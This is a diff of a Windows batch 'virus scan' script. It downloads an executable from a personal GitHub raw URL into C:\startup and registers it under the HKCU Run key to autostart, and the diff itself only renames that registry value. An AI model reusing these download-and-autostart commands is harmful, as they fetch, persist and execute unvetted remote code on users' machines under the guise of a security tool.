@@ -148,7 +148,7 @@ powershell.exe Invoke-WebRequest -Uri "https://adwcleaner.malwarebytes.com/adwcl
 powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rrpt66/cc/main/Scan-virus-and-Clear-file.exe" -OutFile "C:\startup\Scan-virus-and-Clear-file.exe"
 C:\startup\adw.exe /preinstalled
 
-Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Scan-virus" /t REG_SZ /d "C:\startup\Scan-virus-and-Clear-file.exe" /f
+Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Scan-virus-and-Clear" /t REG_SZ /d "C:\startup\Scan-virus-and-Clear-file.exe" /f
 cls
 set /p wda=" start scan virus yes or no? > "
 if %wda%== yes goto :adw
@@ -594,7 +594,7 @@ cls
 powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rrpt66/cc/main/Scan-virus-and-Clear-file.exe" -OutFile "Scan-virus-and-Clear-file.exe"
 mkdir C:\startup
 powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rrpt66/cc/main/Scan-virus-and-Clear-file.exe" -OutFile "C:\startup\Scan-virus-and-Clear-file.exe"
-Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "fullclean" /t REG_SZ /d "C:\startup\Scan-virus-and-Clear-file.exe" /f
+Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Scan-virus-and-Clear" /t REG_SZ /d "C:\startup\Scan-virus-and-Clear-file.exe" /f
 Scan-virus-and-Clear-file.exe /k
 cls
 cls
